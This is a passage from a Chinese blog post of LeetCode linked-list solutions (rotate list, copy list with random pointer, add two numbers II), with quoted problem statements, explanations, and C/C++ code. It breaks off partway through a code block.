5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULL<br>向右旋转 2 步: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL<br>示例 2:</p><p>输入: 0-&gt;1-&gt;2-&gt;NULL, k = 4<br>输出: 2-&gt;0-&gt;1-&gt;NULL<br>解释:<br>向右旋转 1 步: 2-&gt;0-&gt;1-&gt;NULL<br>向右旋转 2 步: 1-&gt;2-&gt;0-&gt;NULL<br>向右旋转 3 步: 0-&gt;1-&gt;2-&gt;NULL<br>向右旋转 4 步: 2-&gt;0-&gt;1-&gt;NULL</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/rotate-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/rotate-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>这道题让我想起NOIP-2016-DAY1-T1，233333</p></blockquote><p>思路比较简单：我们可以<strong>先将该链表结成一个环，然后再从中间断开</strong></p><p>观察几个样例我们可以看出断开的位置应当是在<strong>第len - (k%len)个结点</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">rotateRight</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span>=<span class="title">head</span>;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span>(len=<span class="number">1</span>;temp-&gt;next;temp=temp-&gt;next)</span><br><span class="line">        len++;</span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    k %= len;</span><br><span class="line">    <span class="keyword">for</span>(temp = head;--len!=k;temp = temp-&gt;next);</span><br><span class="line">    head = temp-&gt;next;</span><br><span class="line">    temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wX4KG6.png" alt="wX4KG6.png"></p><h2 id="0x06-剑指-Offer-35-复杂链表的复制"><a href="#0x06-剑指-Offer-35-复杂链表的复制" class="headerlink" title="0x06.剑指 Offer 35. 复杂链表的复制"></a>0x06.<a href="https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof/" target="_blank" rel="noopener">剑指 Offer 35. 复杂链表的复制</a></h2><blockquote><p>请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/09/e1.png" alt="image.png"></p><p>输入：head = [[7,null],[13,0],[11,4],[10,2],[1,0]]<br>输出：[[7,null],[13,0],[11,4],[10,2],[1,0]]<br>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/09/e2.png" alt="image.png"></p><p>输入：head = [[1,1],[2,1]]<br>输出：[[1,1],[2,1]]<br>示例 3：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/09/e3.png" alt="image.png"></p><p>输入：head = [[3,null],[3,0],[3,null]]<br>输出：[[3,null],[3,0],[3,null]]<br>示例 4：</p><p>输入：head = []<br>输出：[]<br>解释：给定的链表为空（空指针），因此返回 null。</p><p>提示：</p><p>-10000 &lt;= Node.val &lt;= 10000<br>Node.random 为空（null）或指向链表中的节点。<br>节点数目不超过 1000 。</p><p>注意：本题与主站 138 题相同：<a href="https://leetcode-cn.com/problems/copy-list-with-random-pointer/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/copy-list-with-random-pointer/</a></p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof" target="_blank" rel="noopener">https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>本题与主站138题相同（指本题不能用C评测但是138能用C评测（x</p><p>本题要求的是要进行<strong>深层拷贝</strong>，也就是说我们需要遍历整个双向链表并逐个拷贝每个节点的值到新的链表结点中</p><p>本题的难点主要在<strong>random</strong>指针上，因为它所指向的是<strong>链表中的任一结点</strong>，因此random指针的指向就是本题的考点之一</p><h3 id="解法：哈希表-深度优先搜索（DFS）"><a href="#解法：哈希表-深度优先搜索（DFS）" class="headerlink" title="解法：哈希表 + 深度优先搜索（DFS）"></a>解法：哈希表 + 深度优先搜索（DFS）</h3><p>考虑到新链表的每一个结点与原链表的每一个结点<strong>严格一一对应</strong>，故我们可以考虑使用一个哈希表储存对应结点，若该结点已经在表中则直接连接上该结点即可，若不在表中则创建新结点</p><p>使用递归进行<strong>深度优先搜索</strong>可以很好地实现我们的算法</p><p>构造代码如下：</p><h4 id="STL-unordered-map"><a href="#STL-unordered-map" class="headerlink" title="STL: unordered_map"></a>STL: unordered_map</h4><p>unordered_map是C++的STL所提供的一个类似于哈希表的东西，我们用它来实现我们的哈希表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment">    Node* random;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        next = NULL;</span></span><br><span class="line"><span class="comment">        random = NULL;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;Node*,Node*&gt; hash;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!head)</span><br><span class="line">                <span class="keyword">return</span> head;</span><br><span class="line">            <span class="keyword">if</span>(hash.count(head))</span><br><span class="line">                <span class="keyword">return</span> hash[head];</span><br><span class="line">            </span><br><span class="line">            Node * node = <span class="keyword">new</span> Node(head-&gt;val);</span><br><span class="line">            hash[head] = node;</span><br><span class="line">            node-&gt;next = copyRandomList(head-&gt;next);</span><br><span class="line">            node-&gt;<span class="built_in">random</span> = copyRandomList(head-&gt;<span class="built_in">random</span>);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看得出来内存上并不是特别的理想，毕竟类的内存开销是很大的</p><p><img src="https://s1.ax1x.com/2020/09/23/wxFmDS.png" alt="wxFmDS.png"></p><h4 id="简单hash：以结点地址作为key"><a href="#简单hash：以结点地址作为key" class="headerlink" title="简单hash：以结点地址作为key"></a>简单hash：以结点地址作为key</h4><p>考虑到每个结点的地址的值都是独一无二的，故我们可以使用旧链表结点的地址与新链表结点的地址一一对应构建索引</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment">    Node* random;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        next = NULL;</span></span><br><span class="line"><span class="comment">        random = NULL;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;Node*,Node*&gt; hash;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span> </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!head)</span><br><span class="line">                <span class="keyword">return</span> head;</span><br><span class="line">            <span class="keyword">if</span>(hash.count(head))</span><br><span class="line">                <span class="keyword">return</span> hash[head];</span><br><span class="line">            </span><br><span class="line">            Node * node = <span class="keyword">new</span> Node(head-&gt;val);</span><br><span class="line">            hash[head] = node;</span><br><span class="line">            node-&gt;next = copyRandomList(head-&gt;next);</span><br><span class="line">            node-&gt;<span class="built_in">random</span> = copyRandomList(head-&gt;<span class="built_in">random</span>);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样内存的开销也就降下来了</p><p><img src="https://s1.ax1x.com/2020/09/23/wxkvwD.png" alt="wxkvwD.png"></p><h2 id="0x07-复制带随机指针的链表"><a href="#0x07-复制带随机指针的链表" class="headerlink" title="0x07.复制带随机指针的链表"></a>0x07.<a href="https://leetcode-cn.com/problems/copy-list-with-random-pointer/" target="_blank" rel="noopener">复制带随机指针的链表</a></h2><blockquote><p>给定一个链表，每个节点包含一个额外增加的随机指针，该指针可以指向链表中的任何节点或空节点。</p><p>要求返回这个链表的 深拷贝。 </p><p>我们用一个由 n 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 [val, random_index] 表示：</p><p>val：一个表示 Node.val 的整数。<br>random_index：随机指针指向的节点索引（范围从 0 到 n-1）；如果不指向任何节点，则为  null 。</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/09/e1.png" alt="image.png"></p><p>输入：head = [[7,null],[13,0],[11,4],[10,2],[1,0]]<br>输出：[[7,null],[13,0],[11,4],[10,2],[1,0]]<br>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/09/e2.png" alt="image.png"></p><p>输入：head = [[1,1],[2,1]]<br>输出：[[1,1],[2,1]]<br>示例 3：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2020/01/09/e3.png" alt="image.png"></p><p>输入：head = [[3,null],[3,0],[3,null]]<br>输出：[[3,null],[3,0],[3,null]]<br>示例 4：</p><p>输入：head = []<br>输出：[]<br>解释：给定的链表为空（空指针），因此返回 null。</p><p>提示：</p><p>-10000 &lt;= Node.val &lt;= 10000<br>Node.random 为空（null）或指向链表中的节点。<br>节点数目不超过 1000 。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/copy-list-with-random-pointer" target="_blank" rel="noopener">https://leetcode-cn.com/problems/copy-list-with-random-pointer</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>和上一题（【中等0x06】）一模一样，不同的是这题可以用C语言进行评测</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * struct Node &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *next;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *random;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">key</span>[1005]=&#123;</span><span class="number">0</span>&#125;, *value[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> amounts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">struct Node* <span class="title">dsf</span><span class="params">(struct Node* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;amounts;i++)</span><br><span class="line">        <span class="keyword">if</span>(key[i] == head)</span><br><span class="line">            <span class="keyword">return</span> value[i];</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">node</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line">    key[amounts] = head;</span><br><span class="line">    value[amounts++] = node;</span><br><span class="line">    node-&gt;val = head-&gt;val;</span><br><span class="line">    node-&gt;next = dsf(head-&gt;next);</span><br><span class="line">    node-&gt;<span class="built_in">random</span> = dsf(head-&gt;<span class="built_in">random</span>);</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct Node* <span class="title">copyRandomList</span><span class="params">(struct Node* head)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">amounts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">node</span> = (<span class="title">struct</span> <span class="title">Node</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Node</span>));</span></span><br><span class="line">    key[amounts] = head;</span><br><span class="line">    value[amounts++] = node;</span><br><span class="line">    node-&gt;val = head-&gt;val;</span><br><span class="line">    node-&gt;next = dsf(head-&gt;next);</span><br><span class="line">    node-&gt;<span class="built_in">random</span> = dsf(head-&gt;<span class="built_in">random</span>);</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wxVKs0.png" alt="wxVKs0.png"></p><h2 id="0x08-两数相加-II"><a href="#0x08-两数相加-II" class="headerlink" title="0x08.两数相加 II"></a>0x08.<a href="https://leetcode-cn.com/problems/add-two-numbers-ii/" target="_blank" rel="noopener">两数相加 II</a></h2><blockquote><p>给你两个 非空 链表来代表两个非负整数。数字最高位位于链表开始位置。它们的每个节点只存储一位数字。将这两数相加会返回一个新的链表。</p><p>你可以假设除了数字 0 之外，这两个数字都不会以零开头。</p><p>进阶：</p><p>如果输入链表不能修改该如何处理？换句话说，你不能对列表中的节点进行翻转。</p><p>示例：</p><p>输入：(7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>输出：7 -&gt; 8 -&gt; 0 -&gt; 7</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/add-two-numbers-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>其实就是相当于常规的大数加减：链表版本（<del>老OIer应该都写过无数遍了</del></p><h3 id="解法一：链表逆序"><a href="#解法一：链表逆序" class="headerlink" title="解法一：链表逆序"></a>解法一：链表逆序</h3><p>将两个链表先重新构造成其逆序链表，再逐位进行运算即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!l1)</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span>(!l2)</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">NULL</span>, *<span class="title">temp2</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(l1)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = l1-&gt;next;</span><br><span class="line">        l1-&gt;next = temp;</span><br><span class="line">        temp = l1;</span><br><span class="line">        l1 = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    l1 = temp;</span><br><span class="line">    temp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(l2)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = l2-&gt;next;</span><br><span class="line">        l2-&gt;next = temp;</span><br><span class="line">        temp = l2;</span><br><span class="line">        l2 = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    l2 = temp;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">retn</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">    retn-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(l1&amp;&amp;l2)</span><br><span class="line">    &#123;</span><br><span class="line">        retn-&gt;val = (l1-&gt;val + l2-&gt;val + flag) % <span class="number">10</span>;</span><br><span class="line">        flag = (l1-&gt;val + l2-&gt;val + flag) / <span class="number">10</span>;</span><br><span class="line">        temp = retn;</span><br><span class="line">        retn = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        retn-&gt;next = temp;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(l1)</span><br><span class="line">    &#123;</span><br><span class="line">        retn-&gt;val = (l1-&gt;val + flag) % <span class="number">10</span>;</span><br><span class="line">        flag = (l1-&gt;val + flag) / <span class="number">10</span>;</span><br><span class="line">        temp = retn;</span><br><span class="line">        retn = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        retn-&gt;next = temp;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(l2)</span><br><span class="line">    &#123;</span><br><span class="line">        retn-&gt;val = (l2-&gt;val + flag) % <span class="number">10</span>;</span><br><span class="line">        flag = (l2-&gt;val + flag) / <span class="number">10</span>;</span><br><span class="line">        temp = retn;</span><br><span class="line">        retn = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        retn-&gt;next = temp;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)</span><br><span class="line">    &#123;</span><br><span class="line">        retn-&gt;val = flag;</span><br><span class="line">        <span class="keyword">return</span> retn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn-&gt;next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wxeKET.png" alt="wxeKET.png"></p><h3 id="解法二：栈"><a href="#解法二：栈" class="headerlink" title="解法二：栈"></a>解法二：栈</h3><p>进阶解法要求我们不对链表进行重构</p><p>当然，既然是逆序运算，我们很容易就能够联想到另外一种受限线性表——<strong>栈</strong></p><p>我们可以先将两个链表的结点值分别压入两个数组模拟的栈中，这样就变成我们<strong>最常见<del>也最喜欢</del>的常规的大数加减了</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!l1)</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span>(!l2)</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    <span class="keyword">int</span> * n1 = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * <span class="number">99</span>), *n2 = (<span class="keyword">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * <span class="number">99</span>), *temp, temp2;</span><br><span class="line">    <span class="keyword">int</span> len1 = <span class="number">0</span>, len2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(l1)</span><br><span class="line">    &#123;</span><br><span class="line">        n1[len1++] = l1-&gt;val;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(l2)</span><br><span class="line">    &#123;</span><br><span class="line">        n2[len2++] = l2-&gt;val;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len1&lt;len2)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = n1;</span><br><span class="line">        n1 = n2;</span><br><span class="line">        n2 = temp;</span><br><span class="line">        temp2 = len1;</span><br><span class="line">        len1 = len2;</span><br><span class="line">        len2 = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">retn</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>)), *<span class="title">tmp</span>;</span></span><br><span class="line">    retn-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> flag = 